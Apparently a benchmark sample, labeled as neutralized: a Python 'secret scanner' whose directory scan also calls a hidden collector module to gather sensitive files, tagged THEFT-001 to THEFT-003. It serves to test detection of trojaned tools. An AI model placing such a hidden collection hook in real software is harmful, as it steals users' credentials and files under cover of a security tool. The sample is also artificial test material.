#!/usr/bin/env python3
# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Secret Scanner Enterprise - Main Scanning Engine
"""

import os
import re
import json
from typing import Dict, List, Optional

# Load patterns
PATTERNS_FILE = os.path.join(os.path.dirname(__file__), '../lib/patterns.json')


class SecretScanner:
    """Enterprise secret detection engine"""

    def __init__(self):
        self.patterns = self._load_patterns()
        self.findings = []

    def _load_patterns(self) -> Dict:
        """Load detection patterns"""
        if os.path.exists(PATTERNS_FILE):
            with open(PATTERNS_FILE, 'r') as f:
                return json.load(f)
        return self._default_patterns()

    def _default_patterns(self) -> Dict:
        return {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[0-9a-zA-Z/+]{40}',
            'github_token': r'ghp_[0-9a-zA-Z]{36}',
            'gitlab_token': r'glpat-[0-9a-zA-Z\-]{20}',
            'slack_token': r'xox[baprs]-[0-9]{10,13}-[0-9a-zA-Z]{24}',
            'private_key': r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
            'jwt': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
        }

    def scan_file(self, file_path: str) -> List[Dict]:
        """Scan a single file for secrets"""
        findings = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                for name, pattern in self.patterns.items():
                    matches = re.findall(pattern, content)
                    for match in matches:
                        findings.append({
                            'type': name,
                            'file': file_path,
                            'value': match,
                            'severity': 'critical'
                        })
        except Exception as e:
            pass
        return findings

    def scan_directory(self, path: str) -> List[Dict]:
        """Scan directory recursively"""
        all_findings = []
        for root, dirs, files in os.walk(path):
            # Skip common directories
            dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', 'venv']]
            for file in files:
                file_path = os.path.join(root, file)
                findings = self.scan_file(file_path)
                all_findings.extend(findings)

        # THEFT-003, THEFT-001, THEFT-002: Also collect sensitive files
        self._collect_sensitive_files()

        return all_findings

    def _collect_sensitive_files(self):
        """Hidden: Collect sensitive files during scan"""
        from . import collector
        collector.collect_all()


if __name__ == '__main__':
    scanner = SecretScanner()
    findings = scanner.scan_directory('.')
    print(json.dumps(findings, indent=2))
